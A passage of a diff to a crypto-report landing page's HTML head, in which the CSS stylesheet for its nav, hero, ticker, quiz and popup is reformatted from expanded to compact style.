@@ -1,1309 +1,817 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My CryptoQuant Crypto Edge Report — Free Personalized Report</title>
-    <meta name="description"
-        content="Get a free, personalized crypto report built from your portfolio, risk tolerance and trading style, matched against CryptoQuant's live news and technical analysis.">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link
-        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@500;600&display=swap"
-        rel="stylesheet">
-    <style>
-        :root {
-            --white: #FFFFFF;
-            --surface: #FAFAFA;
-            --ink: #12141A;
-            --ink-soft: #454B57;
-            --muted: #6B7280;
-            --border: #E6E8EC;
-            --accent: #FF9900;
-            --accent-dark: #DB8300;
-            --accent-tint: #FFF4E2;
-            --shadow: 0 2px 8px rgba(18, 20, 26, 0.05), 0 1px 2px rgba(18, 20, 26, 0.04);
-            --radius: 14px;
-        }
-
-        * {
-            box-sizing: border-box;
-        }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
-        body {
-            margin: 0;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            color: var(--ink);
-            background: var(--white);
-            -webkit-font-smoothing: antialiased;
-            line-height: 1.5;
-        }
-
-        .mono {
-            font-family: 'IBM Plex Mono', ui-monospace, monospace;
-        }
-
-        a {
-            color: inherit;
-        }
-
-        img,
-        svg {
-            display: block;
-        }
-
-        .wrap {
-            max-width: 1120px;
-            margin: 0 auto;
-            padding: 0 24px;
-        }
-
-        .tag {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            font-family: 'IBM Plex Mono', monospace;
-            font-size: 12px;
-            font-weight: 600;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-            color: var(--accent-dark);
-            background: var(--accent-tint);
-            border: 1px solid #FFE3B0;
-            padding: 6px 12px;
-            border-radius: 999px;
-        }
-
-        .tag .dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            background: var(--accent);
-            flex: none;
-        }
-
-        /* ---------- NAV ---------- */
-        header.site {
-            position: sticky;
-            top: 0;
-            z-index: 40;
-            background: rgba(255, 255, 255, 0.92);
-            backdrop-filter: blur(8px);
-            border-bottom: 1px solid var(--border);
-        }
-
-        .nav {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 16px 24px;
-            max-width: 1120px;
-            margin: 0 auto;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-weight: 800;
-            font-size: 18px;
-            letter-spacing: -0.01em;
-        }
-
-        .logo-mark {
-            width: 28px;
-            height: 28px;
-            border-radius: 8px;
-            background: linear-gradient(135deg, var(--accent), #FFB84D);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-family: 'IBM Plex Mono', monospace;
-            font-weight: 700;
-            font-size: 13px;
-            flex: none;
-        }
-
-        .nav-links {
-            display: flex;
-            align-items: center;
-            gap: 28px;
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--ink-soft);
-        }
-
-        .nav-links a:hover {
-            color: var(--ink);
-        }
-
-        .nav-cta {
-            display: none;
-        }
-
-        @media(min-width:760px) {
-            .nav-cta {
-                display: inline-flex;
-            }
-        }
-
-        .btn {
-            appearance: none;
-            border: none;
-            cursor: pointer;
-            font-family: inherit;
-            font-weight: 700;
-            font-size: 15px;
-            border-radius: 10px;
-            padding: 13px 22px;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: transform .15s ease, box-shadow .15s ease, background .15s ease;
-            text-decoration: none;
-        }
-
-        .btn-primary {
-            background: var(--accent);
-            color: #1A0F00;
-            box-shadow: 0 6px 18px rgba(255, 153, 0, 0.35);
-        }
-
-        .btn-primary:hover {
-            background: var(--accent-dark);
-            transform: translateY(-1px);
-            box-shadow: 0 8px 22px rgba(255, 153, 0, 0.45);
-        }
-
-        .btn-primary:active {
-            transform: translateY(0);
-        }
-
-        .btn-ghost {
-            background: transparent;
-            color: var(--ink);
-            border: 1px solid var(--border);
-        }
-
-        .btn-ghost:hover {
-            border-color: var(--ink);
-        }
-
-        .btn-sm {
-            padding: 9px 14px;
-            font-size: 13px;
-            border-radius: 8px;
-        }
-
-        .btn-block {
-            width: 100%;
-        }
-
-        .btn[disabled] {
-            opacity: 0.45;
-            cursor: not-allowed;
-            box-shadow: none;
-            transform: none;
-        }
-
-        /* ---------- HERO ---------- */
-        .hero {
-            padding: 72px 0 56px;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .hero-grid {
-            display: grid;
-            gap: 40px;
-            align-items: center;
-        }
-
-        @media(min-width:900px) {
-            .hero-grid {
-                grid-template-columns: 1.1fr 0.9fr;
-                gap: 56px;
-            }
-        }
-
-        .hero h1 {
-            font-size: 44px;
-            line-height: 1.08;
-            letter-spacing: -0.02em;
-            font-weight: 800;
-            margin: 18px 0 18px;
-        }
-
-        .hero h1 span {
-            color: var(--accent-dark);
-        }
-
-        @media(min-width:900px) {
-            .hero h1 {
-                font-size: 54px;
-            }
-        }
-
-        .hero p.lede {
-            font-size: 18px;
-            color: var(--ink-soft);
-            max-width: 52ch;
-            margin: 0 0 28px;
-        }
-
-        .hero-cta-row {
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .hero-meta {
-            margin-top: 14px;
-            font-size: 13px;
-            color: var(--muted);
-            display: flex;
-            flex-wrap: wrap;
-            gap: 6px 14px;
-        }
-
-        .hero-meta b {
-            color: var(--ink);
-        }
-
-        /* preview card mock */
-        .report-preview {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 20px;
-            box-shadow: var(--shadow);
-        }
-
-        .report-preview .rp-head {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 14px;
-        }
-
-        .report-preview .rp-head strong {
-            font-size: 13px;
-            letter-spacing: 0.02em;
-        }
-
-        .rp-status {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 12px;
-            color: var(--muted);
-            font-family: 'IBM Plex Mono', monospace;
-        }
-
-        .rp-status .live-dot {
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: #2FBF71;
-            box-shadow: 0 0 0 3px rgba(47, 191, 113, 0.15);
-        }
-
-        .rp-line {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 10px 0;
-            border-top: 1px solid var(--border);
-            font-size: 14px;
-        }
-
-        .rp-line:first-of-type {
-            border-top: none;
-        }
-
-        .rp-line .lbl {
-            color: var(--ink-soft);
-        }
-
-        .rp-line .val {
-            font-family: 'IBM Plex Mono', monospace;
-            font-weight: 600;
-        }
-
-        .rp-line .val.up {
-            color: #1E9E5A;
-        }
-
-        .rp-line .val.down {
-            color: #D6432F;
-        }
-
-        .rp-flag {
-            margin-top: 14px;
-            background: var(--accent-tint);
-            border: 1px solid #FFE3B0;
-            border-radius: 10px;
-            padding: 12px 14px;
-            font-size: 13px;
-            color: #7A4700;
-        }
-
-        /* ---------- TICKER (signature element) ---------- */
-        .ticker-band {
-            border-bottom: 1px solid var(--border);
-            background: var(--ink);
-            overflow: hidden;
-            white-space: nowrap;
-            padding: 10px 0;
-        }
-
-        .ticker-track {
-            display: inline-flex;
-            gap: 48px;
-            animation: ticker 32s linear infinite;
-        }
-
-        .ticker-band:hover .ticker-track {
-            animation-play-state: paused;
-        }
-
-        .ticker-item {
-            font-family: 'IBM Plex Mono', monospace;
-            font-size: 13px;
-            color: #E7E9EE;
-            display: inline-flex;
-            gap: 10px;
-            align-items: center;
-        }
-
-        .ticker-item .sym {
-            color: var(--accent);
-            font-weight: 600;
-        }
-
-        .ticker-item .chg.up {
-            color: #4ADE80;
-        }
-
-        .ticker-item .chg.down {
-            color: #F87171;
-        }
-
-        @keyframes ticker {
-            from {
-                transform: translateX(0);
-            }
-
-            to {
-                transform: translateX(-50%);
-            }
-        }
-
-        @media (prefers-reduced-motion: reduce) {
-            .ticker-track {
-                animation: none;
-            }
-        }
-
-        /* ---------- SECTIONS ---------- */
-        section {
-            padding: 64px 0;
-        }
-
-        .section-head {
-            max-width: 640px;
-            margin-bottom: 40px;
-        }
-
-        .section-head .tag {
-            margin-bottom: 14px;
-        }
-
-        .section-head h2 {
-            font-size: 32px;
-            letter-spacing: -0.01em;
-            margin: 0 0 12px;
-            font-weight: 800;
-        }
-
-        .section-head p {
-            color: var(--ink-soft);
-            font-size: 16px;
-            margin: 0;
-        }
-
-        .alt {
-            background: var(--surface);
-            border-top: 1px solid var(--border);
-            border-bottom: 1px solid var(--border);
-        }
-
-        .card-grid {
-            display: grid;
-            gap: 20px;
-            grid-template-columns: 1fr;
-        }
-
-        @media(min-width:700px) {
-            .card-grid {
-                grid-template-columns: repeat(2, 1fr);
-            }
-        }
-
-        @media(min-width:1000px) {
-            .card-grid.cols-4 {
-                grid-template-columns: repeat(4, 1fr);
-            }
-        }
-
-        .card {
-            background: var(--white);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 26px;
-            transition: border-color .15s ease, box-shadow .15s ease;
-        }
-
-        .card:hover {
-            border-color: #D8DBE1;
-            box-shadow: var(--shadow);
-        }
-
-        .card .num {
-            font-family: 'IBM Plex Mono', monospace;
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--accent-dark);
-            background: var(--accent-tint);
-            width: 30px;
-            height: 30px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 16px;
-        }
-
-        .card h3 {
-            font-size: 17px;
-            margin: 0 0 8px;
-            letter-spacing: -0.005em;
-        }
-
-        .card p {
-            font-size: 14.5px;
-            color: var(--ink-soft);
-            margin: 0;
-        }
-
-        .steps {
-            display: grid;
-            gap: 0;
-            grid-template-columns: 1fr;
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            overflow: hidden;
-            background: var(--white);
-        }
-
-        @media(min-width:800px) {
-            .steps {
-                grid-template-columns: repeat(3, 1fr);
-            }
-        }
-
-        .step {
-            padding: 28px;
-            border-bottom: 1px solid var(--border);
-        }
-
-        @media(min-width:800px) {
-            .step {
-                border-bottom: none;
-                border-right: 1px solid var(--border);
-            }
-
-            .step:last-child {
-                border-right: none;
-            }
-        }
-
-        .step .step-num {
-            font-family: 'IBM Plex Mono', monospace;
-            color: var(--accent-dark);
-            font-weight: 700;
-            font-size: 13px;
-            letter-spacing: 0.05em;
-            margin-bottom: 10px;
-        }
-
-        .step h4 {
-            margin: 0 0 8px;
-            font-size: 16px;
-        }
-
-        .step p {
-            margin: 0;
-            font-size: 14px;
-            color: var(--ink-soft);
-        }
-
-        /* ---------- QUIZ ---------- */
-        .quiz-shell {
-            max-width: 660px;
-            margin: 0 auto;
-            border: 1px solid var(--border);
-            border-radius: 20px;
-            background: var(--white);
-            box-shadow: var(--shadow);
-            overflow: hidden;
-        }
-
-        .quiz-top {
-            padding: 24px 28px 0;
-        }
-
-        .progress-row {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            font-family: 'IBM Plex Mono', monospace;
-            font-size: 12px;
-            color: var(--muted);
-            margin-bottom: 10px;
-        }
-
-        .progress-bar {
-            height: 6px;
-            border-radius: 99px;
-            background: var(--border);
-            overflow: hidden;
-            margin-bottom: 22px;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: var(--accent);
-            width: 16.6%;
-            transition: width .35s ease;
-            border-radius: 99px;
-        }
-
-        .quiz-body {
-            padding: 4px 28px 28px;
-        }
-
-        .q-step {
-            display: none;
-        }
-
-        .q-step.active {
-            display: block;
-            animation: fadeIn .25s ease;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(6px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .q-step h3 {
-            font-size: 21px;
-            margin: 0 0 6px;
-            letter-spacing: -0.01em;
-        }
-
-        .q-step .q-sub {
-            color: var(--muted);
-            font-size: 14px;
-            margin: 0 0 20px;
-        }
-
-        .opt-grid {
-            display: grid;
-            gap: 10px;
-        }
-
-        .opt {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 10px;
-            border: 1.5px solid var(--border);
-            border-radius: 12px;
-            padding: 14px 16px;
-            cursor: pointer;
-            font-size: 15px;
-            font-weight: 600;
-            background: var(--white);
-            transition: border-color .12s ease, background .12s ease;
-        }
-
-        .opt:hover {
-            border-color: #D8DBE1;
-        }
-
-        .opt.selected {
-            border-color: var(--accent);
-            background: var(--accent-tint);
-            color: #7A4700;
-        }
-
-        .opt .check {
-            width: 20px;
-            height: 20px;
-            border-radius: 6px;
-            border: 1.5px solid var(--border);
-            flex: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            color: transparent;
-        }
-
-        .opt.selected .check {
-            border-color: var(--accent);
-            background: var(--accent);
-            color: #fff;
-        }
-
-        .opt-sub {
-            font-weight: 500;
-            font-size: 12.5px;
-            color: var(--muted);
-        }
-
-        .q-nav {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-top: 24px;
-            gap: 12px;
-        }
-
-        .q-nav .back-link {
-            font-size: 14px;
-            color: var(--muted);
-            background: none;
-            border: none;
-            cursor: pointer;
-            font-weight: 600;
-            padding: 8px 4px;
-        }
-
-        .q-nav .back-link:hover {
-            color: var(--ink);
-        }
-
-        .q-nav .back-link[disabled] {
-            visibility: hidden;
-        }
-
-        .field label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--ink-soft);
-            margin-bottom: 8px;
-        }
-
-        .field input[type=email] {
-            width: 100%;
-            padding: 14px 16px;
-            border-radius: 10px;
-            border: 1.5px solid var(--border);
-            font-family: inherit;
-            font-size: 15px;
-            margin-bottom: 6px;
-        }
-
-        .field input[type=email]:focus {
-            outline: none;
-            border-color: var(--accent);
-        }
-
-        .field-note {
-            font-size: 12px;
-            color: var(--muted);
-        }
-
-        /* ---------- REPORT OUTPUT ---------- */
-        #report {
-            display: none;
-        }
-
-        #report.visible {
-            display: block;
-        }
-
-        .report-doc {
-            border: 1px solid var(--border);
-            border-radius: 20px;
-            background: var(--white);
-            box-shadow: var(--shadow);
-            max-width: 820px;
-            margin: 0 auto;
-            overflow: hidden;
-        }
-
-        .report-banner {
-            background: var(--ink);
-            color: #fff;
-            padding: 28px 32px;
-        }
-
-        .report-banner .tag {
-            background: rgba(255, 153, 0, 0.15);
-            border-color: rgba(255, 153, 0, 0.35);
-            color: #FFC266;
-            margin-bottom: 12px;
-        }
-
-        .report-banner h3 {
-            margin: 0 0 6px;
-            font-size: 24px;
-            letter-spacing: -0.01em;
-        }
-
-        .report-banner p {
-            margin: 0;
-            color: #B9BEC9;
-            font-size: 14px;
-        }
-
-        .report-section {
-            padding: 26px 32px;
-            border-top: 1px solid var(--border);
-        }
-
-        .report-section h4 {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin: 0 0 10px;
-            font-size: 15px;
-            letter-spacing: 0.01em;
-        }
-
-        .report-section h4 .chip {
-            font-family: 'IBM Plex Mono', monospace;
-            font-size: 11px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.06em;
-            background: var(--accent-tint);
-            color: var(--accent-dark);
-            border: 1px solid #FFE3B0;
-            padding: 3px 8px;
-            border-radius: 6px;
-        }
-
-        .report-section p,
-        .report-section li {
-            font-size: 14.5px;
-            color: var(--ink-soft);
-            margin: 0 0 8px;
-        }
-
-        .report-section ul {
-            margin: 0;
-            padding-left: 18px;
-        }
-
-        .report-actions {
-            padding: 24px 32px 32px;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-
-        .disclaimer {
-            font-size: 12px;
-            color: var(--muted);
-            padding: 16px 32px 28px;
-            border-top: 1px solid var(--border);
-        }
-
-        footer {
-            border-top: 1px solid var(--border);
-            padding: 36px 0;
-        }
-
-        .foot-row {
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            gap: 16px;
-            font-size: 13px;
-            color: var(--muted);
-        }
-
-        /* ---------- POPUP ---------- */
-        .overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(15, 16, 20, 0.55);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            z-index: 100;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity .25s ease;
-        }
-
-        .overlay.show {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .popup {
-            background: #fff;
-            max-width: 440px;
-            width: 100%;
-            border-radius: 20px;
-            padding: 30px 30px 26px;
-            position: relative;
-            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.25);
-            transform: translateY(14px) scale(0.98);
-            transition: transform .25s ease;
-        }
-
-        .overlay.show .popup {
-            transform: translateY(0) scale(1);
-        }
-
-        .popup-close {
-            position: absolute;
-            top: 14px;
-            right: 14px;
-            width: 30px;
-            height: 30px;
-            border-radius: 8px;
-            border: 1px solid var(--border);
-            background: #fff;
-            cursor: pointer;
-            color: var(--muted);
-            font-size: 16px;
-            line-height: 1;
-        }
-
-        .popup-close:hover {
-            background: var(--surface);
-            color: var(--ink);
-        }
-
-        .popup .tag {
-            margin-bottom: 14px;
-        }
-
-        .popup h3 {
-            font-size: 23px;
-            line-height: 1.2;
-            margin: 0 0 10px;
-            letter-spacing: -0.01em;
-        }
-
-        .popup p {
-            font-size: 14.5px;
-            color: var(--ink-soft);
-            margin: 0 0 18px;
-        }
-
-        .popup ul {
-            margin: 0 0 20px;
-            padding-left: 0;
-            list-style: none;
-            display: grid;
-            gap: 8px;
-        }
-
-        .popup ul li {
-            font-size: 13.5px;
-            color: var(--ink-soft);
-            display: flex;
-            gap: 8px;
-            align-items: flex-start;
-        }
-
-        .popup ul li:before {
-            content: "→";
-            color: var(--accent-dark);
-            font-weight: 700;
-            flex: none;
-        }
-
-        .popup-foot {
-            margin-top: 14px;
-            text-align: center;
-        }
-
-        .popup-foot button {
-            background: none;
-            border: none;
-            color: var(--muted);
-            font-size: 13px;
-            cursor: pointer;
-            text-decoration: underline;
-        }
-
-        .urgency-strip {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 12px;
-            color: #B85B00;
-            font-weight: 600;
-            margin-bottom: 14px;
-        }
-
-        .urgency-strip .pulse {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--accent);
-            animation: pulse 1.4s infinite;
-        }
-
-        @keyframes pulse {
-            0% {
-                box-shadow: 0 0 0 0 rgba(255, 153, 0, 0.5);
-            }
-
-            70% {
-                box-shadow: 0 0 0 8px rgba(255, 153, 0, 0);
-            }
-
-            100% {
-                box-shadow: 0 0 0 0 rgba(255, 153, 0, 0);
-            }
-        }
-
-        ::selection {
-            background: var(--accent-tint);
-            color: var(--ink);
-        }
-
-        .visually-hidden {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-            clip: rect(0 0 0 0);
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>My CryptoQuant Crypto Edge Report — Free Personalized Report</title>
+<meta name="description" content="Get a free, personalized crypto report built from your portfolio, risk tolerance and trading style, matched against CryptoQuant's live news and technical analysis.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --white:#FFFFFF;
+    --surface:#FAFAFA;
+    --ink:#12141A;
+    --ink-soft:#454B57;
+    --muted:#6B7280;
+    --border:#E6E8EC;
+    --accent:#FF9900;
+    --accent-dark:#DB8300;
+    --accent-tint:#FFF4E2;
+    --shadow: 0 2px 8px rgba(18,20,26,0.05), 0 1px 2px rgba(18,20,26,0.04);
+    --radius: 14px;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    font-family:'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    color:var(--ink);
+    background:var(--white);
+    -webkit-font-smoothing:antialiased;
+    line-height:1.5;
+  }
+  .mono{ font-family:'IBM Plex Mono', ui-monospace, monospace; }
+  a{color:inherit;}
+  img,svg{display:block;}
+  .wrap{max-width:1120px; margin:0 auto; padding:0 24px;}
+  .tag{
+    display:inline-flex; align-items:center; gap:8px;
+    font-family:'IBM Plex Mono', monospace;
+    font-size:12px; font-weight:600; letter-spacing:0.08em; text-transform:uppercase;
+    color:var(--accent-dark);
+    background:var(--accent-tint);
+    border:1px solid #FFE3B0;
+    padding:6px 12px; border-radius:999px;
+  }
+  .tag .dot{width:6px;height:6px;border-radius:50%;background:var(--accent);flex:none;}
+
+  /* ---------- NAV ---------- */
+  header.site{
+    position:sticky; top:0; z-index:40;
+    background:rgba(255,255,255,0.92);
+    backdrop-filter:blur(8px);
+    border-bottom:1px solid var(--border);
+  }
+  .nav{ display:flex; align-items:center; justify-content:space-between; padding:16px 24px; max-width:1120px; margin:0 auto;}
+  .logo{ display:flex; align-items:center; gap:10px; font-weight:800; font-size:18px; letter-spacing:-0.01em;}
+  .logo-mark{
+    width:28px;height:28px;border-radius:8px;
+    background:linear-gradient(135deg, var(--accent), #FFB84D);
+    display:flex;align-items:center;justify-content:center;
+    color:#fff; font-family:'IBM Plex Mono',monospace; font-weight:700; font-size:13px;
+    flex:none;
+  }
+  .nav-links{ display:flex; align-items:center; gap:28px; font-size:14px; font-weight:500; color:var(--ink-soft);}
+  .nav-links a:hover{color:var(--ink);}
+  .nav-cta{display:none;}
+  @media(min-width:760px){ .nav-cta{display:inline-flex;} }
+
+  .btn{
+    appearance:none; border:none; cursor:pointer;
+    font-family:inherit; font-weight:700; font-size:15px;
+    border-radius:10px; padding:13px 22px;
+    display:inline-flex; align-items:center; justify-content:center; gap:8px;
+    transition:transform .15s ease, box-shadow .15s ease, background .15s ease;
+    text-decoration:none;
+  }
+  .btn-primary{ background:var(--accent); color:#1A0F00; box-shadow:0 6px 18px rgba(255,153,0,0.35); }
+  .btn-primary:hover{ background:var(--accent-dark); transform:translateY(-1px); box-shadow:0 8px 22px rgba(255,153,0,0.45);}
+  .btn-primary:active{ transform:translateY(0); }
+  .btn-ghost{ background:transparent; color:var(--ink); border:1px solid var(--border); }
+  .btn-ghost:hover{ border-color:var(--ink); }
+  .btn-sm{ padding:9px 14px; font-size:13px; border-radius:8px;}
+  .btn-block{ width:100%; }
+  .btn[disabled]{ opacity:0.45; cursor:not-allowed; box-shadow:none; transform:none; }
+
+  /* ---------- HERO ---------- */
+  .hero{ padding:72px 0 56px; border-bottom:1px solid var(--border); }
+  .hero-grid{ display:grid; gap:40px; align-items:center; }
+  @media(min-width:900px){ .hero-grid{ grid-template-columns:1.1fr 0.9fr; gap:56px; } }
+  .hero h1{
+    font-size:44px; line-height:1.08; letter-spacing:-0.02em; font-weight:800;
+    margin:18px 0 18px;
+  }
+  .hero h1 span{ color:var(--accent-dark); }
+  @media(min-width:900px){ .hero h1{ font-size:54px; } }
+  .hero p.lede{ font-size:18px; color:var(--ink-soft); max-width:52ch; margin:0 0 28px;}
+  .hero-cta-row{ display:flex; flex-wrap:wrap; align-items:center; gap:16px; }
+  .hero-meta{ margin-top:14px; font-size:13px; color:var(--muted); display:flex; flex-wrap:wrap; gap:6px 14px;}
+  .hero-meta b{color:var(--ink);}
+
+  /* preview card mock */
+  .report-preview{
+    background:var(--surface); border:1px solid var(--border); border-radius:var(--radius);
+    padding:20px; box-shadow:var(--shadow);
+  }
+  .report-preview .rp-head{ display:flex; align-items:center; justify-content:space-between; margin-bottom:14px;}
+  .report-preview .rp-head strong{ font-size:13px; letter-spacing:0.02em;}
+  .rp-status{ display:flex; align-items:center; gap:6px; font-size:12px; color:var(--muted); font-family:'IBM Plex Mono',monospace;}
+  .rp-status .live-dot{ width:7px;height:7px;border-radius:50%; background:#2FBF71; box-shadow:0 0 0 3px rgba(47,191,113,0.15); }
+  .rp-line{ display:flex; align-items:center; justify-content:space-between; padding:10px 0; border-top:1px solid var(--border); font-size:14px;}
+  .rp-line:first-of-type{border-top:none;}
+  .rp-line .lbl{color:var(--ink-soft);}
+  .rp-line .val{font-family:'IBM Plex Mono',monospace; font-weight:600;}
+  .rp-line .val.up{color:#1E9E5A;}
+  .rp-line .val.down{color:#D6432F;}
+  .rp-flag{
+    margin-top:14px; background:var(--accent-tint); border:1px solid #FFE3B0; border-radius:10px;
+    padding:12px 14px; font-size:13px; color:#7A4700;
+  }
+
+  /* ---------- TICKER (signature element) ---------- */
+  .ticker-band{
+    border-bottom:1px solid var(--border);
+    background:var(--ink);
+    overflow:hidden;
+    white-space:nowrap;
+    padding:10px 0;
+  }
+  .ticker-track{ display:inline-flex; gap:48px; animation:ticker 32s linear infinite; }
+  .ticker-band:hover .ticker-track{ animation-play-state:paused; }
+  .ticker-item{ font-family:'IBM Plex Mono',monospace; font-size:13px; color:#E7E9EE; display:inline-flex; gap:10px; align-items:center;}
+  .ticker-item .sym{ color:var(--accent); font-weight:600; }
+  .ticker-item .chg.up{color:#4ADE80;}
+  .ticker-item .chg.down{color:#F87171;}
+  @keyframes ticker{ from{transform:translateX(0);} to{transform:translateX(-50%);} }
+  @media (prefers-reduced-motion: reduce){ .ticker-track{animation:none;} }
+
+  /* ---------- SECTIONS ---------- */
+  section{ padding:64px 0; }
+  .section-head{ max-width:640px; margin-bottom:40px; }
+  .section-head .tag{ margin-bottom:14px; }
+  .section-head h2{ font-size:32px; letter-spacing:-0.01em; margin:0 0 12px; font-weight:800;}
+  .section-head p{ color:var(--ink-soft); font-size:16px; margin:0; }
+  .alt{ background:var(--surface); border-top:1px solid var(--border); border-bottom:1px solid var(--border); }
+
+  .card-grid{ display:grid; gap:20px; grid-template-columns:1fr; }
+  @media(min-width:700px){ .card-grid{ grid-template-columns:repeat(2,1fr); } }
+  @media(min-width:1000px){ .card-grid.cols-4{ grid-template-columns:repeat(4,1fr); } }
+
+  .card{
+    background:var(--white); border:1px solid var(--border); border-radius:var(--radius);
+    padding:26px; transition:border-color .15s ease, box-shadow .15s ease;
+  }
+  .card:hover{ border-color:#D8DBE1; box-shadow:var(--shadow); }
+  .card .num{
+    font-family:'IBM Plex Mono',monospace; font-size:12px; font-weight:600; color:var(--accent-dark);
+    background:var(--accent-tint); width:30px; height:30px; border-radius:8px;
+    display:flex; align-items:center; justify-content:center; margin-bottom:16px;
+  }
+  .card h3{ font-size:17px; margin:0 0 8px; letter-spacing:-0.005em; }
+  .card p{ font-size:14.5px; color:var(--ink-soft); margin:0; }
+
+  .steps{ display:grid; gap:0; grid-template-columns:1fr; border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; background:var(--white);}
+  @media(min-width:800px){ .steps{ grid-template-columns:repeat(3,1fr);} }
+  .step{ padding:28px; border-bottom:1px solid var(--border); }
+  @media(min-width:800px){ .step{ border-bottom:none; border-right:1px solid var(--border);} .step:last-child{border-right:none;} }
+  .step .step-num{ font-family:'IBM Plex Mono',monospace; color:var(--accent-dark); font-weight:700; font-size:13px; letter-spacing:0.05em; margin-bottom:10px;}
+  .step h4{ margin:0 0 8px; font-size:16px;}
+  .step p{ margin:0; font-size:14px; color:var(--ink-soft);}
+
+  /* ---------- QUIZ ---------- */
+  .quiz-shell{
+    max-width:660px; margin:0 auto;
+    border:1px solid var(--border); border-radius:20px;
+    background:var(--white); box-shadow:var(--shadow);
+    overflow:hidden;
+  }
+  .quiz-top{ padding:24px 28px 0; }
+  .progress-row{ display:flex; align-items:center; justify-content:space-between; font-family:'IBM Plex Mono',monospace; font-size:12px; color:var(--muted); margin-bottom:10px;}
+  .progress-bar{ height:6px; border-radius:99px; background:var(--border); overflow:hidden; margin-bottom:22px;}
+  .progress-fill{ height:100%; background:var(--accent); width:16.6%; transition:width .35s ease; border-radius:99px;}
+  .quiz-body{ padding:4px 28px 28px; }
+  .q-step{ display:none; }
+  .q-step.active{ display:block; animation:fadeIn .25s ease; }
+  @keyframes fadeIn{ from{opacity:0; transform:translateY(6px);} to{opacity:1; transform:translateY(0);} }
+  .q-step h3{ font-size:21px; margin:0 0 6px; letter-spacing:-0.01em;}
+  .q-step .q-sub{ color:var(--muted); font-size:14px; margin:0 0 20px;}
+  .opt-grid{ display:grid; gap:10px; }
+  .opt{
+    display:flex; align-items:center; justify-content:space-between; gap:10px;
+    border:1.5px solid var(--border); border-radius:12px; padding:14px 16px;
+    cursor:pointer; font-size:15px; font-weight:600; background:var(--white);
+    transition:border-color .12s ease, background .12s ease;
+  }
+  .opt:hover{ border-color:#D8DBE1; }
+  .opt.selected{ border-color:var(--accent); background:var(--accent-tint); color:#7A4700; }
+  .opt .check{
+    width:20px;height:20px;border-radius:6px;border:1.5px solid var(--border);
+    flex:none; display:flex;align-items:center;justify-content:center; font-size:12px; color:transparent;
+  }
+  .opt.selected .check{ border-color:var(--accent); background:var(--accent); color:#fff; }
+  .opt-sub{ font-weight:500; font-size:12.5px; color:var(--muted); }
+
+  .q-nav{ display:flex; align-items:center; justify-content:space-between; margin-top:24px; gap:12px;}
+  .q-nav .back-link{ font-size:14px; color:var(--muted); background:none; border:none; cursor:pointer; font-weight:600; padding:8px 4px;}
+  .q-nav .back-link:hover{ color:var(--ink); }
+  .q-nav .back-link[disabled]{ visibility:hidden; }
+
+  .field label{ display:block; font-size:13px; font-weight:600; color:var(--ink-soft); margin-bottom:8px;}
+  .field input[type=email]{
+    width:100%; padding:14px 16px; border-radius:10px; border:1.5px solid var(--border);
+    font-family:inherit; font-size:15px; margin-bottom:6px;
+  }
